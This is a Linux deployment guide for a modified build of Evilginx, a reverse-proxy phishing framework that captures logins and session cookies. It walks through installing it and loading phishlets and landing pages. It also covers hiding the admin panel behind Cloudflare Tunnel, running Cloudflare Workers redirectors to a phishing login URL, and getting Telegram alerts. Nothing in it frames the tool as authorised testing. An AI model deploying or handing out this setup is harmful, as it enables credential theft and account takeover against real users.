# Evilginx 3.5.5 Private Dev Edition — Linux Setup Guide

This file summarizes the Linux deployment options for Evilginx 3.5.5 Private Dev Edition in one place.

## Supported Linux Platforms

- Ubuntu 20.04 / 22.04 / 24.04
- Debian 11 / 12
- AMD64 and ARM64 supported by the installer
- Recommended: 2GB RAM, 2 CPU cores, 20GB storage

## Deployment Options for Linux

| Method | Best for | Notes |
| --- | --- | --- |
| Automated installer | Quick setup | Recommended for Ubuntu/Debian systems; handles dependencies, Go install, config, service, firewall. |
| Manual build | Custom environments | Use when you want full control over installation, paths, or non-standard Linux builds. |
| Docker (experimental) | Containerized deployment | Useful for isolated testing and portable environments. |
| Cloudflare Tunnel | Remote admin access | Optional remote access to the admin panel through Cloudflare Tunnel. |
| Cloudflare Workers | Redirector distribution | Use with Evilginx redirectors to distribute traffic at the edge. |

---

## 1. Linux Automated Installer (Recommended)

The installer supports Ubuntu 20.04/22.04/24.04 and Debian 11/12 on amd64 and arm64.

```bash
cd ~/Evilginxmod3
chmod +x install.sh
sudo ./install.sh
```

### Installer modes

```bash
sudo ./install.sh                # Full installation (recommended)
sudo ./install.sh --upgrade      # Rebuild and reinstall only
sudo ./install.sh --uninstall    # Remove Evilginx binary, service, scripts, and config
sudo ./install.sh --tunnel       # Install Cloudflare Tunnel only
sudo ./install.sh --dry-run      # Show steps without making changes
```

### Post-install commands

```bash
evilginx-start
evilginx-stop
evilginx-restart
evilginx-status
evilginx-logs
evilginx-console
```

---

## 2. Manual Build from Source

Use this option when you want to inspect the source, customize paths, or build on a Linux distro not covered by the automated installer.

```bash
# Install Go 1.25.7+ and build tools
sudo apt update && sudo apt install -y build-essential libsqlite3-dev wget curl
wget https://go.dev/dl/go1.25.7.linux-amd64.tar.gz
sudo rm -rf /usr/local/go
sudo tar -C /usr/local -xzf go1.25.7.linux-amd64.tar.gz
export PATH="$PATH:/usr/local/go/bin"

# Build Evilginx
cd ~/Evilginxmod3
CGO_ENABLED=1 go build -mod=vendor -o build/evilginx main.go

# Install binary and capabilities
sudo cp build/evilginx /usr/local/bin/evilginx
sudo chmod +x /usr/local/bin/evilginx
sudo setcap 'cap_net_bind_service=+ep' /usr/local/bin/evilginx
```

### Optional asset installation

```bash
mkdir -p ~/.evilginx/phishlets ~/.evilginx/redirectors ~/.evilginx/post_redirectors ~/.evilginx/landing_pages
cp -r phishlets/* ~/.evilginx/phishlets/
cp -r redirectors/* ~/.evilginx/redirectors/
cp -r post_redirectors/* ~/.evilginx/post_redirectors/
cp -r landing_pages/* ~/.evilginx/landing_pages/
cp -r web ~/.evilginx/web
cp -r gophish/static ~/.evilginx/static
```

---

## 3. Docker Deployment (Experimental)

```bash
docker build -t evilginxmod3 .
docker run -it \
  -p 443:443 -p 80:80 -p 53:53/udp \
  -p 2030:2030 -p 3333:3333 \
  -v $(pwd)/phishlets:/root/phishlets \
  -v $(pwd)/landing_pages:/root/landing_pages \
  -v ~/.evilginx:/root/.evilginx \
  evilginxmod3
```

> Note: Docker deployment is experimental and may require additional network or volume configuration for DNS, TLS, and systemd service integration.

---

## 4. Cloudflare Tunnel for Remote Admin Access

If you need remote access to the Evilginx admin panel without exposing it directly on the public internet, use the Cloudflare Tunnel setup.

```bash
TUNNEL_DOMAIN=example.com sudo ./install.sh --tunnel
# or
sudo bash setup-tunnel.sh
```

---

## 5. Cloudflare Workers Deployment

Evilginx supports deploying Cloudflare Workers as redirectors from the CLI.

```bash
cloudflare deploy my-redirector simple https://phish.example.com/login
cloudflare list
cloudflare status my-redirector
```

Deploy worker scripts to Cloudflare Workers when you want edge-based redirectors and better distribution.

---

## 6. Telegram Bot Notifications

Telegram alerts are built into Evilginx and should be configured after installation.

```bash
config telegram bot_token <your_bot_token>
config telegram chat_id <your_chat_id>
config telegram enabled true
config telegram test
```

### Telegram setup steps

1. Create a bot with `@BotFather`.
2. Save the bot token.
3. Send a message to the bot or add it to a group.
4. Find your chat ID with `@get_id_bot` or a similar bot.
5. Enable Telegram notifications and run `config telegram test`.

---

## 7. Recommended Linux Deployments

- **Best overall:** Automated installer on Ubuntu/Debian.
- **Best control:** Manual build from source.
- **Best isolation:** Docker experimental container.
- **Best remote admin:** Cloudflare Tunnel.
- **Best edge redirectors:** Cloudflare Workers.

---

## 8. Quick Linux Deployment Commands

```bash
# Linux install
sudo ./install.sh

# Start Evilginx
evilginx-start

# Configure public IP and domains
config ipv4 external YOUR_VPS_IP
domains set phishing.example.com

# Enable Telegram notifications
config telegram bot_token <token>
config telegram chat_id <id>
config telegram enabled true
config telegram test
```
